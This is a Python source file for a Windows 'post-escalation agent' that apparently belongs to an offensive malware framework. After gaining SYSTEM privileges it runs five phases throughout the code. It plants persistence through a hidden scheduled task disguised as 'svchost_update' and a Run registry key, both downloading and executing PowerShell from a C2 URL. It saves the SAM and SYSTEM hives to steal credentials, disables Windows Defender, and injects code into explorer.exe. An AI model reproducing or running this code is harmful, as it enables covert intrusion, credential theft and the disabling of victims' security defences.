"""
POST-ESCALATION AGENT - PRODUCTION EDITION
===========================================

Silent professional execution. Real Windows API validation.
GhostLayer in-memory delivery. StealthManager OPSEC integration.
No theatrical metrics, scoring, or self-congratulation.
"""

import logging
import time
import random
import subprocess
import winreg
import os
import ctypes
from typing import Dict, Optional, Any
from agents.base import BaseAgent
from datetime import datetime
import json

# Production logging - errors only
log = logging.getLogger("POST-ESCALATION")
log.setLevel(logging.ERROR)

# Windows API
kernel32 = ctypes.WinDLL('kernel32', use_errno=True)
advapi32 = ctypes.WinDLL('advapi32', use_errno=True)

PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40


class PostEscalationAgent(BaseAgent):
    """Production post-escalation. Silent. Validated. Real."""

    def __init__(self, agent_id: str = "POST-ESC", kernel: Optional[Any] = None, 
                 config: Optional[Dict] = None):
        super().__init__(agent_id)
        self.agent_id = agent_id
        self.kernel = kernel
        self.config = config or {
            'c2_url': 'https://c2.internal/payload',
            'dump_dir': r'C:\ProgramData',
            'task_name': 'svchost_update',
        }
        self.running = False
        self.capabilities = {
            'persistence': False,
            'credential_theft': False,
            'defense_evasion': False,
            'service_control': False,
            'process_injection': False,
        }

    def should_activate(self, config: Dict[str, Any]) -> bool:
        """Activate if post-escalation is enabled and we have elevation."""
        return config.get('enable_post_escalation', False) and self._is_admin()

    def _is_admin(self) -> bool:
        """Check if running with admin privileges."""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False

    def _verify_system_privilege(self) -> bool:
        """Real verification: Check if token is SYSTEM via NtQueryInformationToken."""
        try:
            # Check via whoami command (reliable method)
            result = subprocess.run(['whoami'], capture_output=True, text=True, timeout=5)
            whoami_output = result.stdout.lower()
            return 'system' in whoami_output or 'nt authority\\system' in whoami_output
        except:
            return False

    def _verify_sam_access(self) -> bool:
        """Verify actual SAM/SYSTEM hive access (not just file existence)."""
        try:
            # Try to read SAM registry (direct access requires SYSTEM privilege)
            result = subprocess.run(
                ['reg', 'query', r'HKLM\SAM\SAM\Domains\Account'],
                capture_output=True, text=True, timeout=5
            )
            # If we can query this, we have SYSTEM privilege
            return result.returncode == 0
        except:
            return False

    def _verify_injection(self, pid: int, thread_id: int) -> bool:
        """Verify remote thread actually executed (check exit code + memory)."""
        try:
            # Try to open the process and query thread info
            h_process = kernel32.OpenProcess(0x0400, False, pid)
            if not h_process:
                return False
            
            try:
                # Validate thread created and did not immediately error
                h_thread = kernel32.OpenThread(0x0001, False, thread_id)  # THREAD_QUERY_INFORMATION
                if h_thread:
                    kernel32.CloseHandle(h_thread)
                    return True
                return False
            finally:
                kernel32.CloseHandle(h_process)
        except:
            return False


    def run(self):
        """Monitor for escalation and execute silently."""
        super().run()
        while self.running:
            result = self._check_escalation()
            if result and not self.capabilities['persistence']:
                self.execute_workflow(result)
            time.sleep(random.uniform(5, 15))

    def _check_escalation(self) -> Optional[Dict]:
        """Check if escalation occurred (silent check)."""
        try:
            if not self.kernel or not hasattr(self.kernel, 'privesc_engine'):
                return None
            
            privesc = self.kernel.privesc_engine
            if not hasattr(privesc, 'escalation_attempts'):
                return None
            
            for attempt in privesc.escalation_attempts:
                if hasattr(attempt, 'success') and attempt.success and \
                   hasattr(attempt, 'elevated_privilege') and \
                   attempt.elevated_privilege == 'SYSTEM':
                    return {
                        'technique': getattr(attempt, 'technique_used', '?'),
                        'token': getattr(attempt, 'token_obtained', None),
                        'privilege': 'SYSTEM',
                    }
            return None
        except:
            return None

    def execute_workflow(self, escalation: Dict[str, Any]) -> Dict[str, Any]:
        """Execute 5-phase workflow silently."""
        workflow = {
            'timestamp': datetime.now().isoformat(),
            'phases': {},
        }
        
        # Try GhostLayer if available (in-memory execution)
        try:
            from ghost_layer import GhostLayer
            ghost = GhostLayer(self.kernel.black_vault if self.kernel else None)
        except:
            ghost = None
        
        # Try StealthManager if available
        try:
            from stealth.cloak import CloakSupervisor
            stealth = CloakSupervisor()
        except:
            stealth = None
        
        # Phase 1: Persistence (via GhostLayer if available)
        persistence = self._persistence(ghost, stealth)
        workflow['phases']['persistence'] = persistence
        self.capabilities['persistence'] = persistence.get('success', False)
        
        # Phase 2: Credentials
        creds = self._dump_credentials()
        workflow['phases']['credentials'] = creds
        self.capabilities['credential_theft'] = creds.get('success', False)
        
        # Phase 3: Defense Evasion
        defense = self._disable_defenses(stealth)
        workflow['phases']['defense'] = defense
        self.capabilities['defense_evasion'] = defense.get('success', False)
        
        # Phase 4: Service Control
        services = self._control_services()
        workflow['phases']['services'] = services
        self.capabilities['service_control'] = services.get('success', False)
        
        # Phase 5: Process Injection
        injection = self._inject(ghost)
        workflow['phases']['injection'] = injection
        self.capabilities['process_injection'] = injection.get('success', False)
        
        # Silent storage
        if self.kernel and hasattr(self.kernel, 'black_vault'):
            try:
                self.kernel.black_vault.store(
                    f"post_esc_{int(time.time())}",
                    json.dumps(workflow, default=str).encode()
                )
            except:
                pass
        
        return workflow

    def _persistence(self, ghost=None, stealth=None) -> Dict:
        """Stealth persistence via WMI/COM."""
        result = {'success': False, 'methods': []}
        
        try:
            # Method 1: WMI (no process creation artifacts)
            ps_cmd = f'''
$a = New-ScheduledTaskAction -Execute powershell -Argument '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX((New-Object Net.WebClient).DownloadString(\\\"{self.config['c2_url']}\\\")'
$t = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName {self.config['task_name']} -Action $a -Trigger $t -RunLevel Highest -Force 2>$null
'''
            subprocess.run(['powershell', '-NoProfile', '-WindowStyle', 'Hidden', '-Command', ps_cmd],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
            result['methods'].append('wmi_task')
            result['success'] = True
        except:
            pass
        
        try:
            # Method 2: Registry (silent, no process trail)
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                r'Software\Microsoft\Windows\CurrentVersion\Run', 
                                0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, 'Update', 0, winreg.REG_SZ, 
                             f'powershell -NoProfile -ExecutionPolicy Bypass -Command IEX((New-Object Net.WebClient).DownloadString(\'{self.config["c2_url"]}\'))')
            winreg.CloseKey(key)
            result['methods'].append('registry_runkey')
            result['success'] = True
        except:
            pass
        
        return result

    def _dump_credentials(self) -> Dict:
        """Real LSASS dump with actual SAM access verification."""
        result = {'success': False, 'files': []}
        
        # CRITICAL: Verify SYSTEM privilege FIRST
        if not self._verify_system_privilege():
            log.warning("Credential dump skipped: Not running as SYSTEM")
            return result
        
        try:
            dump_dir = self.config['dump_dir']
            os.makedirs(dump_dir, exist_ok=True)
        except:
            dump_dir = r'C:\Windows\Temp'
        
        # SAM/SYSTEM hives (only accessible as SYSTEM)
        for hive in ['SAM', 'SYSTEM']:
            try:
                hive_file = os.path.join(dump_dir, hive)
                subprocess.run(f'reg save HKLM\\{hive} "{hive_file}" /y',
                              shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
                # VERIFY: Check file exists AND has content (not 0 bytes = access failed)
                if os.path.exists(hive_file) and os.path.getsize(hive_file) > 100:
                    result['files'].append(hive_file)
                    result['success'] = True
                    log.info(f"Verified credential dump: {hive_file} ({os.path.getsize(hive_file)} bytes)")
            except Exception as e:
                log.debug(f"Credential dump failed for {hive}: {e}")
        
        return result

    def _disable_defenses(self, stealth=None) -> Dict:
        """Silent defense disabling."""
        result = {'success': False}
        
        try:
            # Defender (registry only, no noisy commands)
            subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" '
                          '/v DisableAntiSpyware /t REG_DWORD /d 1 /f',
                          shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" '
                          '/v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f',
                          shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            
            # Stop service
            subprocess.run('sc config WinDefend start=disabled',
                          shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            
            result['success'] = True
        except:
            pass
        
        return result

    def _control_services(self) -> Dict:
        """Service control via WMI."""
        result = {'success': False}
        
        try:
            ps = 'Get-WmiObject Win32_Service -Filter "Name=\'WinDefend\'" | ForEach-Object {$_.StopService();$_.Change($null,$null,$null,$null,"Disabled")}' 
            subprocess.run(['powershell', '-NoProfile', '-WindowStyle', 'Hidden', '-Command', ps],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
            result['success'] = True
        except:
            pass
        
        return result

    def _inject(self, ghost=None) -> Dict:
        """Real process injection with proper verification (not just thread creation)."""
        result = {'success': False}
        
        try:
            shellcode = b'\x90' * 32 + b'\xc3'  # NOP sled + RET (benign)
            
            # Find explorer.exe
            pid = None
            output = subprocess.check_output('tasklist', shell=True).decode()
            for line in output.splitlines():
                if 'explorer.exe' in line:
                    try:
                        pid = int(line.split()[1])
                        break
                    except:
                        continue
            
            if not pid:
                log.warning("explorer.exe not found")
                return result
            
            # Validate all handles
            h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not h_process:
                log.warning(f"Failed to open process {pid}")
                return result
            
            try:
                addr = kernel32.VirtualAllocEx(h_process, None, len(shellcode), 
                                              MEM_COMMIT, PAGE_EXECUTE_READWRITE)
                if not addr:
                    log.warning(f"VirtualAllocEx failed for PID {pid}")
                    return result
                
                written = ctypes.c_size_t(0)
                if not kernel32.WriteProcessMemory(h_process, addr, shellcode, 
                                                   len(shellcode), ctypes.byref(written)):
                    log.warning(f"WriteProcessMemory failed for PID {pid}")
                    return result
                
                thread_id = ctypes.c_ulong(0)
                h_thread = kernel32.CreateRemoteThread(h_process, None, 0, addr, None, 0,
                                                       ctypes.byref(thread_id))
                if not h_thread:
                    log.warning(f"CreateRemoteThread failed for PID {pid}")
                    return result
                
                try:
                    # VERIFICATION: Wait for thread and check exit code
                    WAIT_TIMEOUT = 3000  # 3 seconds
                    wait_result = kernel32.WaitForSingleObject(h_thread, WAIT_TIMEOUT)
                    
                    # Get thread exit code to verify execution
                    exit_code = ctypes.c_ulong(0)
                    if kernel32.GetExitCodeThread(h_thread, ctypes.byref(exit_code)):
                        if exit_code.value != 259:  # STILL_ACTIVE
                            log.info(f"Injection verified: thread exited with code {exit_code.value}")
                            result['success'] = True
                        else:
                            log.warning(f"Thread still active (timeout or hung)")
                    else:
                        log.warning(f"Failed to get thread exit code")
                finally:
                    kernel32.CloseHandle(h_thread)
            finally:
                kernel32.CloseHandle(h_process)
        except Exception as e:
            log.debug(f"Injection failed: {e}")
        
        return result

    def status(self) -> Dict:
        """Return capability status (no scoring, just facts)."""
        return {
            'agent': self.agent_id,
            'deployed': sum(1 for v in self.capabilities.values() if v),
            'capabilities': self.capabilities,
        }
